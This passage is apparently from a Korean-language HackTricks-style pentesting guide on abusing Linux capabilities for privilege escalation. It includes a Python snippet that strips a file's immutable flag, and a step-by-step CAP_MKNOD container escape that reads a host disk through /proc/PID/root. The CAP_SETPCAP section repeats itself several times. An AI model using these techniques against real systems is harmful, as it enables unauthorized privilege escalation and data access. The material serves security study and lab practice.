파일이 immutable 상태이고 python에 이 capability가 있다면 **immutable 속성을 제거하여 파일을 수정 가능하게 만들 수 있습니다:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> 일반적으로 이 immutable attribute는 다음 명령으로 설정 및 해제합니다:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 `chroot(2)` system call을 실행할 수 있게 하며, 알려진 취약점을 통해 `chroot(2)` 환경에서 탈출할 수 있습니다:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 system restart를 위한 `reboot(2)` system call의 실행을 허용할 뿐만 아니라, 특정 hardware platform에 맞게 설계된 `LINUX_REBOOT_CMD_RESTART2`와 같은 명령도 실행할 수 있게 합니다. 또한 새로운 crash kernel 또는 signed crash kernel을 각각 로드하기 위해 `kexec_load(2)`와 Linux 3.17부터 지원되는 `kexec_file_load(2)`의 사용도 허용합니다.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 Linux 2.6.37에서 더 광범위한 **CAP_SYS_ADMIN**으로부터 분리되었으며, 특히 `syslog(2)` call을 사용할 수 있는 권한을 부여합니다. 이 capability는 `kptr_restrict` 설정이 1일 때 `/proc` 및 유사한 interface를 통해 kernel address를 확인할 수 있게 합니다. `kptr_restrict`는 kernel address의 노출 여부를 제어합니다. Linux 2.6.39부터 `kptr_restrict`의 기본값은 0으로, kernel address가 노출됩니다. 하지만 많은 distribution은 보안상의 이유로 이 값을 1(uid 0을 제외하고 address 숨김) 또는 2(address를 항상 숨김)로 설정합니다.

또한 **CAP_SYSLOG**은 `dmesg_restrict`가 1로 설정되어 있을 때 `dmesg` output에 접근할 수 있게 합니다. 이러한 변경에도 불구하고 **CAP_SYS_ADMIN**은 과거의 관례로 인해 `syslog` operation을 수행할 수 있는 권한을 계속 보유합니다.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html)은 일반 file, FIFO(named pipe) 또는 UNIX domain socket을 생성하는 것 이상으로 `mknod` system call의 기능을 확장합니다. 특히 다음과 같은 special file을 생성할 수 있게 합니다:

- **S_IFCHR**: terminal과 같은 character special file.
- **S_IFBLK**: disk와 같은 block special file.

이 capability는 device file을 생성할 수 있어야 하는 process에 필수적이며, character 또는 block device를 통한 직접적인 hardware interaction을 가능하게 합니다.

이는 기본 Docker capability입니다 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

이 capability를 사용하면 다음 조건에서 host에 대한 privilege escalation(full disk read)을 수행할 수 있습니다:

1. Host에 대한 initial access 권한이 있어야 합니다(Unprivileged).
2. Container에 대한 initial access 권한이 있어야 합니다(Privileged (EUID 0), 그리고 effective `CAP_MKNOD`).
3. Host와 container가 동일한 user namespace를 공유해야 합니다.

**Container에서 Block Device를 생성하고 Access하는 단계:**

1. **Standard User로 Host에서:**

- `id`를 사용하여 현재 user ID를 확인합니다(예: `uid=1000(standarduser)`).
- target device를 식별합니다(예: `/dev/sdb`).

2. **`root`로 Container 내부에서:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **호스트로 돌아와서:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
이 접근 방식을 사용하면 표준 사용자가 container를 통해 `/dev/sdb`의 데이터에 접근하고 잠재적으로 읽을 수 있습니다. 이는 device에 설정된 권한과 공유 user namespace를 악용합니다.

### CAP_SETPCAP

**CAP_SETPCAP**은 process가 다른 process의 **capability set을 변경**할 수 있도록 하며, effective, inheritable, permitted set에서 capability를 추가하거나 제거할 수 있게 합니다. 하지만 process는 자신의 permitted set에 보유한 capability만 수정할 수 있으므로, 자신의 권한을 초과하여 다른 process의 privilege를 상승시킬 수는 없습니다. 최근 kernel update에서는 이러한 규칙을 강화하여, `CAP_SETPCAP`이 자신의 permitted set 또는 descendant의 permitted set에 포함된 capability를 줄이는 작업만 수행하도록 제한했습니다. 이를 사용하려면 effective set에 `CAP_SETPCAP`이 있고 target capability가 permitted set에 있어야 하며, 수정을 위해 `capset()`을 사용합니다. 이는 privilege management와 security enhancement에서 `CAP_SETPCAP`의 핵심 기능과 제한 사항을 요약한 것입니다.

**`CAP_SETPCAP`**은 process가 **다른 process의 capability set을 수정**할 수 있도록 하는 Linux capability입니다. 다른 process의 effective, inheritable, permitted capability set에 capability를 추가하거나 제거할 수 있습니다. 하지만 이 capability의 사용 방식에는 몇 가지 제한이 있습니다.

`CAP_SETPCAP`을 가진 process는 **자신의 permitted capability set에 포함된 capability만 부여하거나 제거할 수 있습니다**. 즉, process는 자신이 가지고 있지 않은 capability를 다른 process에 부여할 수 없습니다. 이러한 제한은 process가 자신의 privilege level을 초과하여 다른 process의 privilege를 상승시키는 것을 방지합니다.

또한 최근 kernel version에서는 `CAP_SETPCAP` capability가 **더욱 제한**되었습니다. 이제 process가 다른 process의 capability set을 임의로 수정할 수 없습니다. 대신 **자신의 permitted capability set 또는 descendant의 permitted capability set에 있는 capability를 낮추는 작업만 수행**할 수 있습니다. 이러한 변경은 해당 capability와 관련된 잠재적인 security risk를 줄이기 위해 도입되었습니다.

`CAP_SETPCAP`을 효과적으로 사용하려면 effective capability set에 해당 capability가 있고, target capability가 permitted capability set에 있어야 합니다. 그런 다음 `capset()` system call을 사용하여 다른 process의 capability set을 수정할 수 있습니다.

요약하면, `CAP_SETPCAP`은 process가 다른 process의 capability set을 수정할 수 있도록 하지만, 자신이 가지고 있지 않은 capability를 부여할 수는 없습니다. 또한 security concern으로 인해 최근 kernel version에서는 해당 기능이 자신의 permitted capability set 또는 descendant의 permitted capability set에서 capability를 줄이는 작업만 허용하도록 제한되었습니다.

## References

**이 예제의 대부분은** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)의 일부 lab에서 가져온 것이므로, 이 privesc techniques를 연습하고 싶다면 이러한 lab을 추천합니다.

**Other references**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
